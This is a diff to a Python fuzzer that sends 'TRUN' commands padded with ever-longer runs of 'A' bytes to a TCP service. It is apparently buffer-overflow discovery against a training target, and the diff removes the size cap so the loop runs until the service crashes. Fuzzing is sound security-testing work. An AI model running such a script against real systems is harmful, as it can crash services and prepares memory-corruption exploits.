@@ -3,19 +3,17 @@ import socket
 
 def fuzz(host, port):
     buffersize = 0
+
     try:
-        while buffersize <= 65536:
+        while True:
             buffer = b"".join([
                 b"TRUN",
                 b" ",
-                b"/.:/",
+                b".",
                 b"A" * buffersize
             ])
 
-            sock = socket.socket(
-                socket.AF_INET,
-                socket.SOCK_STREAM
-            )
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(1)
 
             sock.connect((host, port))
@@ -25,12 +23,13 @@ def fuzz(host, port):
                 "Transmiting {} bytes: {}".format(buffersize, buffer)
             )
 
+            sock.recv(1024)
             sock.close()
             buffersize += 10
 
     except socket.error:
         if buffersize == 0:
-            print("Couldn't connect to socket")
+            print("Couldn't connect to socket, end of life")
 
         else:
             print(
